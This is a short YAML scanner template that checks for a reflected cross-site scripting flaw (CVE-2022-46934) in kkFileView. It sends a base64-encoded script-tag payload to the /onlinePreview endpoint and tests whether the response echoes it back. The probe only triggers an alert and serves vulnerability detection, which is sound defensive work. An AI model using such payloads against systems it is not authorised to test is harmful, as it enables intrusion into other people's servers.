name: yaml-poc-keking-kkfileview-xss-CVE-2022-46934
binding: 25acf1a0-78b2-4921-a303-e68ba2447eb9
detail:
    author: jiapeng.han
    links:
        - https://github.com/kekingcn/kkFileView/issues/411
    vulnerability:
        id: d45b56c4-3f65-4d36-889c-6639cf769a60
        level: medium
    warning: Harmless
transport: http
set:
    rand: randomInt(100000, 200000)
    payload: base64('http://"><script>alert(' + string(rand) + ")</script>/test.png")
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /onlinePreview?url={{payload}}
        expression: response.status == 200 && response.body.bcontains(bytes("<script>alert(" + string(rand) + ")</script>/test.png"))
expression: r0()
